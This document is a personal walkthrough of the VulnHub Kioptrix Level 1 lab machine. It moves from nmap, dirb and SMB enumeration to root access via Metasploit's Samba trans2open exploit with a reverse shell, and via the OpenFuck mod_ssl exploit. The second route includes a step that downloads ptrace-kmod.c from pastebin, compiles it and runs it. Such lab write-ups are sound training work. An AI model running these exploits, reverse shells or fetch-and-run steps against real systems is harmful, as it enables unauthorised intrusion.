https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

https://drive.google.com/drive/folders/1CsGWRsmyJm84TAU6U0-72o4Jnb5E9xvs

User - john
pass - TwoCows2


# Doing basic port and service scan

┌──(kali㉿kali)-[~]
└─$ `nmap 192.168.204.134 -p- -A  `                       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-12 12:12 EDT
Nmap scan report for 192.168.204.134
Host is up (0.0016s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32770/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2024-03-13T02:01:03+00:00; +9h47m58s from scanner time.
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: 9h47m57s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.92 seconds

# Enumerating port 80 and 443

┌──(kali㉿kali)-[~]
└─$ `whatweb http://192.168.204.134/ `
http://192.168.204.134/ [200 OK] Apache[1.3.20][mod_ssl/2.8.4], Country[RESERVED][ZZ], Email[webmaster@example.com], HTTPServer[Red Hat Linux][Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], IP[192.168.204.134], OpenSSL[0.9.6b], Title[Test Page for the Apache Web Server on Red Hat Linux]
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ `dirb http://192.168.204.134/ `

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 12 12:25:52 2024
URL_BASE: http://192.168.204.134/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.204.134/ ----
+ http://192.168.204.134/~operator (CODE:403|SIZE:273)                                                            
+ http://192.168.204.134/~root (CODE:403|SIZE:269)                                                                
+ http://192.168.204.134/cgi-bin/ (CODE:403|SIZE:272)                                                             
+ http://192.168.204.134/index.html (CODE:200|SIZE:2890)                                                          
==> DIRECTORY: http://192.168.204.134/manual/                                                                     
==> DIRECTORY: http://192.168.204.134/mrtg/                                                                       
==> DIRECTORY: http://192.168.204.134/usage/                                                                      
                                                                                                                  
---- Entering directory: http://192.168.204.134/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                  
---- Entering directory: http://192.168.204.134/mrtg/ ----
+ http://192.168.204.134/mrtg/index.html (CODE:200|SIZE:17318)                                                    
                                                                                                                  
---- Entering directory: http://192.168.204.134/usage/ ----
+ http://192.168.204.134/usage/index.html (CODE:200|SIZE:3704)                                                    
                                                                                                                  
-----------------
END_TIME: Tue Mar 12 12:26:29 2024
DOWNLOADED: 13836 - FOUND: 6
                                

# Enumerating on port 139 for SMB

┌──(kali㉿kali)-[~]
└─$ `smbclient -L 192.168.204.134  ` 
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX


┌──(kali㉿kali)-[~]
└─`smbclient //192.168.204.134/ADMIN$`
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
                                                                                                                   
┌──(kali㉿kali)-[~]
└─`smbclient //192.168.204.134/IPC$  `
Password for [WORKGROUP\kali]:
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> `?`
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \> `ls`
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> `exit`


msf6 auxiliary(scanner/smb/smb_version) > s`et RHOSTS 192.168.204.134`
RHOSTS => 192.168.204.134
msf6 auxiliary(scanner/smb/smb_version) > `run`

[*] 192.168.204.134:139   - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.204.134:139   -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.204.134:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


# Enumerating SSH

┌──(kali㉿kali)-[~]
└─$ `ssh 192.168.204.134 `            
Unable to negotiate with 192.168.204.134 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

┌──(kali㉿kali)-[~]
└─$ `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1`
Unable to negotiate with 192.168.204.134 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss

┌──(kali㉿kali)-[~]
└─$ `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss`
Unable to negotiate with 192.168.204.134 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se

┌──(kali㉿kali)-[~]
└─$ `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`

The authenticity of host '192.168.204.134 (192.168.204.134)' can't be established.
DSA key fingerprint is SHA256:lEaf2l45SOoTn6qFh/EObfveZjbgCPuTHIXBFtD9mY8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.204.134' (DSA) to the list of known hosts.
kali@192.168.204.134's password: 
Permission denied, please try again.
kali@192.168.204.134's password: 
Permission denied, please try again.
kali@192.168.204.134's password: 
kali@192.168.204.134: Permission denied (publickey,password,keyboard-interactive).
                                                                                                                   
********************************************

Public Exploits found using Goodle and Searchsploi

`80/443` - Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)

  Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow 
https://github.com/heltonWernik/OpenLuck

`139` - Samba trans2open Overflow - This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8

https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/

Manual exploit - https://www.exploit-db.com/exploits/7

https://www.exploit-db.com/exploits/10


# Getting Root using Metasploit automatically
 
- `Using Buffer overflow vulnerabilikty in Samba version `

msf6 auxiliary(scanner/smb/smb_version) > `search trans2open`

Matching Modules
 ================

    #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 auxiliary(scanner/smb/smb_version) > `use 1`
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp

# Note above by default the staged reverse_tcp payload is selected

msf6 exploit(linux/samba/trans2open) > `options`

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
                                      /Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.204.130  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.

msf6 exploit(linux/samba/trans2open) > `set RHOSTS 192.168.204.134`
RHOSTS => 192.168.204.134

msf6 exploit(linux/samba/trans2open) > `run`

[*] Started reverse TCP handler on 192.168.204.130:4444 
[*] 192.168.204.134:139 - Trying return address 0xbffffdfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffcfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffbfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.204.134
[*] 192.168.204.134 - Meterpreter session 5 closed.  Reason: Died
[*] 192.168.204.134:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.204.134
[*] 192.168.204.134 - Meterpreter session 6 closed.  Reason: Died
[-] Meterpreter session 6 is not valid and will be closed
[*] 192.168.204.134:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 192.168.204.134
[*] 192.168.204.134 - Meterpreter session 7 closed.  Reason: Died
[-] Meterpreter session 7 is not valid and will be closed
[*] 192.168.204.134:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.204.134
[*] 192.168.204.134 - Meterpreter session 8 closed.  Reason: Died
[-] Meterpreter session 8 is not valid and will be closed
[*] 192.168.204.134:139 - Trying return address 0xbffff6fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff5fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff4fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff3fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff2fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff1fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff0fc...
^C[-] 192.168.204.134:139 - Exploit failed [user-interrupt]: Interrupt 
[-] run: Interrupted

# Note that ww are using Staged payload and the session is very unstable and dying again and again

msf6 exploit(linux/samba/trans2open) > `search payload linux/x86/`

Matching Modules
================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   0   payload/linux/x86/adduser                                          normal  No     Linux Add User
   1   payload/linux/x86/chmod                                            normal  No     Linux Chmod
   2   payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   3   payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   4   payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   5   payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   6   payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   7   payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   8   payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   9   payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   10  payload/linux/x86/shell_find_port                                  normal  No     Linux Command Shell, Find Port Inline
   11  payload/linux/x86/shell_find_tag                                   normal  No     Linux Command Shell, Find Tag Inline
   12  payload/linux/x86/shell/find_tag                                   normal  No     Linux Command Shell, Find Tag Stager
   13  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   14  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
   15  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   16  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   17  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   18  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   19  payload/linux/x86/exec                                             normal  No     Linux Execute Command
   20  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   21  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   22  payload/linux/x86/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
   23  payload/linux/x86/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
   24  payload/linux/x86/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
   25  payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   26  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   27  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   28  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   29  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   30  payload/linux/x86/meterpreter/find_tag                             normal  No     Linux Mettle x86, Find Tag Stager
   31  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   32  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   33  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   34  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   35  payload/linux/x86/read_file                                        normal  No     Linux Read File


Interact with a module by name or index. For example info 35, use 35 or use payload/linux/x86/read_file


msf6 exploit(linux/samba/trans2open) > `set payload linux/x86/shell_reverse_tcp `
payload => linux/x86/shell_reverse_tcp


msf6 exploit(linux/samba/trans2open) > `run`

[*] Started reverse TCP handler on 192.168.204.130:4444 
[*] 192.168.204.134:139 - Trying return address 0xbffffdfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffcfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffbfc...
[*] 192.168.204.134:139 - Trying return address 0xbffffafc...
[*] 192.168.204.134:139 - Trying return address 0xbffff9fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff8fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff7fc...
[*] 192.168.204.134:139 - Trying return address 0xbffff6fc...
[*] Command shell session 9 opened (192.168.204.130:4444 -> 192.168.204.134:32777) at 2024-03-14 12:06:19 -0400

[*] Command shell session 10 opened (192.168.204.130:4444 -> 192.168.204.134:32778) at 2024-03-14 12:06:20 -0400
[*] Command shell session 11 opened (192.168.204.130:4444 -> 192.168.204.134:32779) at 2024-03-14 12:06:24 -0400
`id`
uid=0(root) gid=0(root) groups=99(nobody)
`whoami`
root


# Gaining Root by Manual Exploit

┌──(kali㉿kali)-[~]
└─$ `git clone https://github.com/heltonWernik/OpenFuck.git`
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Receiving objects: 100% (26/26), 14.14 KiB | 2.02 MiB/s, done.
Resolving deltas: 100% (6/6), done.

┌──(kali㉿kali)-[~/OpenFuck]
└─$ `sudo apt-get install libssl-dev`

┌──(kali㉿kali)-[~/OpenFuck]
└─$ `gcc -o OpenFuck OpenFuck.c -lcrypto `

# checking usage for - pache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)

┌──(kali㉿kali)-[~/OpenFuck]
└─$ `./OpenFuck   `                           

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
        0x03 - Cobalt Sun x (apache-1.3.26)
        0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
        0x05 - Conectiva 4 (apache-1.3.6)
        0x06 - Conectiva 4.1 (apache-1.3.9)
        0x07 - Conectiva 6 (apache-1.3.14)
        0x08 - Conectiva 7 (apache-1.3.12)
        0x09 - Conectiva 7 (apache-1.3.19)
        0x0a - Conectiva 7/8 (apache-1.3.26)
        0x0b - Conectiva 8 (apache-1.3.22)
        0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
        0x0d - Debian GNU Linux (apache_1.3.19-1)
        0x0e - Debian GNU Linux (apache_1.3.22-2)
        0x0f - Debian GNU Linux (apache-1.3.22-2.1)
        0x10 - Debian GNU Linux (apache-1.3.22-5)
        0x11 - Debian GNU Linux (apache_1.3.23-1)
        0x12 - Debian GNU Linux (apache_1.3.24-2.1)
        0x13 - Debian Linux GNU Linux 2 (apache_1.3.24-2.1)
        0x14 - Debian GNU Linux (apache_1.3.24-3)
        0x15 - Debian GNU Linux (apache-1.3.26-1)
        0x16 - Debian GNU Linux 3.0 Woody (apache-1.3.26-1)
        0x17 - Debian GNU Linux (apache-1.3.27)
        0x18 - FreeBSD (apache-1.3.9)
        0x19 - FreeBSD (apache-1.3.11)
        0x1a - FreeBSD (apache-1.3.12.1.40)
        0x1b - FreeBSD (apache-1.3.12.1.40)
        0x1c - FreeBSD (apache-1.3.12.1.40)
        0x1d - FreeBSD (apache-1.3.12.1.40_1)
        0x1e - FreeBSD (apache-1.3.12)
        0x1f - FreeBSD (apache-1.3.14)
        0x20 - FreeBSD (apache-1.3.14)
        0x21 - FreeBSD (apache-1.3.14)
        0x22 - FreeBSD (apache-1.3.14)
        0x23 - FreeBSD (apache-1.3.14)
        0x24 - FreeBSD (apache-1.3.17_1)
        0x25 - FreeBSD (apache-1.3.19)
        0x26 - FreeBSD (apache-1.3.19_1)
        0x27 - FreeBSD (apache-1.3.20)
        0x28 - FreeBSD (apache-1.3.20)
        0x29 - FreeBSD (apache-1.3.20+2.8.4)
        0x2a - FreeBSD (apache-1.3.20_1)
        0x2b - FreeBSD (apache-1.3.22)
        0x2c - FreeBSD (apache-1.3.22_7)
        0x2d - FreeBSD (apache_fp-1.3.23)
        0x2e - FreeBSD (apache-1.3.24_7)
        0x2f - FreeBSD (apache-1.3.24+2.8.8)
        0x30 - FreeBSD 4.6.2-Release-p6 (apache-1.3.26)
        0x31 - FreeBSD 4.6-Realease (apache-1.3.26)
        0x32 - FreeBSD (apache-1.3.27)
        0x33 - Gentoo Linux (apache-1.3.24-r2)
        0x34 - Linux Generic (apache-1.3.14)
        0x35 - Mandrake Linux X.x (apache-1.3.22-10.1mdk)
        0x36 - Mandrake Linux 7.1 (apache-1.3.14-2)
        0x37 - Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)
        0x38 - Mandrake Linux 7.2 (apache-1.3.14-2mdk)
        0x39 - Mandrake Linux 7.2 (apache-1.3.14) 2
        0x3a - Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)
        0x3b - Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)
        0x3c - Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)
        0x3d - Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)
        0x3e - Mandrake Linux 8.0 (apache-1.3.19-3)
        0x3f - Mandrake Linux 8.1 (apache-1.3.20-3)
        0x40 - Mandrake Linux 8.2 (apache-1.3.23-4)
        0x41 - Mandrake Linux 8.2 #2 (apache-1.3.23-4)
        0x42 - Mandrake Linux 8.2 (apache-1.3.24)
        0x43 - Mandrake Linux 9 (apache-1.3.26)
        0x44 - RedHat Linux ?.? GENERIC (apache-1.3.12-1)
        0x45 - RedHat Linux TEST1 (apache-1.3.12-1)
        0x46 - RedHat Linux TEST2 (apache-1.3.12-1)
        0x47 - RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)
        0x48 - RedHat Linux 4.2 (apache-1.1.3-3)
        0x49 - RedHat Linux 5.0 (apache-1.2.4-4)
        0x4a - RedHat Linux 5.1-Update (apache-1.2.6)
        0x4b - RedHat Linux 5.1 (apache-1.2.6-4)
        0x4c - RedHat Linux 5.2 (apache-1.3.3-1)
        0x4d - RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)
        0x4e - RedHat Linux 6.0 (apache-1.3.6-7)
        0x4f - RedHat Linux 6.0 (apache-1.3.6-7)
        0x50 - RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)
        0x51 - RedHat Linux 6.0 Update (apache-1.3.24)
        0x52 - RedHat Linux 6.1 (apache-1.3.9-4)1
        0x53 - RedHat Linux 6.1 (apache-1.3.9-4)2
        0x54 - RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)
        0x55 - RedHat Linux 6.1-fp2000 (apache-1.3.26)
        0x56 - RedHat Linux 6.2 (apache-1.3.12-2)1
        0x57 - RedHat Linux 6.2 (apache-1.3.12-2)2
        0x58 - RedHat Linux 6.2 mod(apache-1.3.12-2)3
        0x59 - RedHat Linux 6.2 update (apache-1.3.22-5.6)1
        0x5a - RedHat Linux 6.2-Update (apache-1.3.22-5.6)2
        0x5b - Redhat Linux 7.x (apache-1.3.22)
        0x5c - RedHat Linux 7.x (apache-1.3.26-1)
        0x5d - RedHat Linux 7.x (apache-1.3.27)
        0x5e - RedHat Linux 7.0 (apache-1.3.12-25)1
        0x5f - RedHat Linux 7.0 (apache-1.3.12-25)2
        0x60 - RedHat Linux 7.0 (apache-1.3.14-2)
        0x61 - RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)
        0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
        0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
        0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
        0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
        0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
        0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
        0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
        0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
        0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
        0x6d - RedHat Linux 7.2 (apache-1.3.24)
        0x6e - RedHat Linux 7.2 (apache-1.3.26)
        0x6f - RedHat Linux 7.2 (apache-1.3.26-snc)
        0x70 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)1
        0x71 - Redhat Linux 7.2 (apache-1.3.26 w/PHP)2
        0x72 - RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)
        0x73 - RedHat Linux 7.3 (apache-1.3.23-11)1
        0x74 - RedHat Linux 7.3 (apache-1.3.23-11)2
        0x75 - RedHat Linux 7.3 (apache-1.3.27)
        0x76 - RedHat Linux 8.0 (apache-1.3.27)
        0x77 - RedHat Linux 8.0-second (apache-1.3.27)
        0x78 - RedHat Linux 8.0 (apache-2.0.40)
        0x79 - Slackware Linux 4.0 (apache-1.3.6)
        0x7a - Slackware Linux 7.0 (apache-1.3.9)
        0x7b - Slackware Linux 7.0 (apache-1.3.26)
        0x7c - Slackware 7.0  (apache-1.3.26)2
        0x7d - Slackware Linux 7.1 (apache-1.3.12)
        0x7e - Slackware Linux 8.0 (apache-1.3.20)
        0x7f - Slackware Linux 8.1 (apache-1.3.24)
        0x80 - Slackware Linux 8.1 (apache-1.3.26)
        0x81 - Slackware Linux 8.1-stable (apache-1.3.26)
        0x82 - Slackware Linux (apache-1.3.27)
        0x83 - SuSE Linux 7.0 (apache-1.3.12)
        0x84 - SuSE Linux 7.1 (apache-1.3.17)
        0x85 - SuSE Linux 7.2 (apache-1.3.19)
        0x86 - SuSE Linux 7.3 (apache-1.3.20)
        0x87 - SuSE Linux 8.0 (apache-1.3.23)
        0x88 - SUSE Linux 8.0 (apache-1.3.23-120)
        0x89 - SuSE Linux 8.0 (apache-1.3.23-137)
        0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise

# Lets use - 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

┌──(kali㉿kali)-[~/OpenFuck]
└─$ `./OpenFuck 0x6b 192.168.204.134 -c 40 `  

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--12:23:28--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @ 436.85 KB/s

12:23:30 (393.16 KB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1408
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root

# **************************************************

# We already got root so no need of Privilege Escalation

